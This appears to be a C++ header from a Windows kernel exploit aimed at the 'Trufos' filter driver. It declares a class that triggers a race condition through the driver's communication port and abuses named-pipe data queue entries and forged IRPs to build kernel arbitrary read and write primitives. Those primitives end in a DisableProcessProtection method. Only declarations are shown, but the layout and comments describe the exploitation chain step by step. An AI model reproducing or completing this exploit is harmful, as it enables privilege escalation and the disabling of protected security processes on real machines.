#pragma once
#include <windows.h>
#include <winternl.h>
#include "Utils.h"
#include "NtoskrnlOffsetFinder.h"

struct XorParams
{
	volatile unsigned __int16* AddressToXor;
	unsigned __int16 ValueToXor;
};
//Used to trigger race condition in trufos
void Xor(XorParams* Params);

class Trufos
{
	bool IsSetupped = false;
	HANDLE Port = NULL;
	bool IsArbitraryReadSetupped = false;
	bool IsArbitraryWriteSetupped = false;
	//Pipe which has one of its data queue entries in user mode address space
	HANDLE VulnerablePipe = INVALID_HANDLE_VALUE;
	//Offset in data in vulnerable pipe at which is data of controlled data queue entry
	UINT64 OffsetOfData = 0;
	//List entry of UserDataQueue
	LIST_ENTRY ListEntryOfUserDataQueue{ 0 };
	//Data queue entry which is user controlled and is in doubly linked list in vulnerable pipe
	DATA_QUEUE_ENTRY* UserDataQueue = nullptr;
	//Used to arbitrary read
	IRP* ArbitraryReadIrp = nullptr;

	void* CcbWithForgedIrps = nullptr;
	HANDLE PipeWithForgedIrps = INVALID_HANDLE_VALUE;
	UINT64 SizeOfForgedIrp = 0;
	IRP* ForgedIrp = nullptr;

	NtoskrnlOffsetFinder OffsetFinder;

	//Connects to filter communication port
	bool ConnectToCommunicationPort();
	//Just sends some messages to filter communication port which 
	//are required to later reach vulnerable function
	void PrepareCommunicationPort();

	bool SetupArbitraryRead();
	bool SetupArbitraryWrite();

	bool ArbitraryRead(void* AddressToReadFrom, void* Destination, UINT64 BytesToRead);
	bool ArbitraryWrite(void* AddressToWrite, void* Source, UINT64 BytesToWrite);

	void* GetEprocessAddressByPid(DWORD ProcessId);

	void FindCcbWithDataQueue(void* Ccb, void* FlinkOfFirstDataQueue, void** OutCcb, void** OutDataQueueEntry);
public:
	Trufos();
	bool DisableProcessProtection(DWORD ProcessId);
	const bool GetIsSetupped();
};